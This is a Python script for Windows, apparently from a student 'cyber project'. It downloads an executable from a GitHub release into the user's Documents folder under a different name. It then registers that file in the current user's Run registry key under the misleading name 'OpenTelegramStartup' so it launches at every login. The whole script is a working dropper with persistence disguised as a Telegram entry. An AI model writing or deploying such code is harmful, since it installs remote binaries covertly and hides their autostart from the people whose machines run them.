import os
import sys
import winreg

# 1. Import your custom download function from download_file.py
from download_file import download_file

# --- CONFIGURATION PARAMETERS ---
DOWNLOAD_URL = "https://github.com/monouk-prog/Cyber-Proj-ANTI-MALICIOUS/releases/latest/download/main.exe"

# Dynamically gets the active user's profile directory (e.g., C:\Users\Username)
USER_PROFILE = os.environ.get("USERPROFILE", r"C:\Users\Public")
# Safely points directly to their standard Documents folder
TARGET_DIR = os.path.join(USER_PROFILE, "Documents")
TARGET_FILE = "monoukfile.exe"

# Correctly joins them to: C:\Users\Username\Documents\monoukfile.exe
TARGET_PATH = os.path.join(TARGET_DIR, TARGET_FILE)
REG_NAME = "OpenTelegramStartup"


def add_to_registry_startup():
    """Adds the fully verified target executable path to Windows Startup Registry."""
    formatted_path = f'"{TARGET_PATH}"'
    registry_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    
    if not os.path.isfile(TARGET_PATH):
        print(f"[-] Error: Target binary not found at: {TARGET_PATH}")
        return

    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, REG_NAME, 0, winreg.REG_SZ, formatted_path)
        winreg.CloseKey(key)
        
        print(f"[+] Success: Applied persistence configurations to Registry!")
        print(f"    Key Entry Name: {REG_NAME}")
        print(f"    Target Path:     {formatted_path}")
    except Exception as e:
        print(f"[-] Failed to execute Registry alteration commands: {e}")


if __name__ == "__main__":
    print("=== Commencing Deployment Operations ===")
    
    # 2. Trigger your imported download function to save inside Documents
    if download_file(DOWNLOAD_URL, TARGET_PATH):
        # 3. If download completes successfully, proceed with registry modifications
        add_to_registry_startup()
    else:
        print("[-] Deployment terminated due to download failure constraints.")
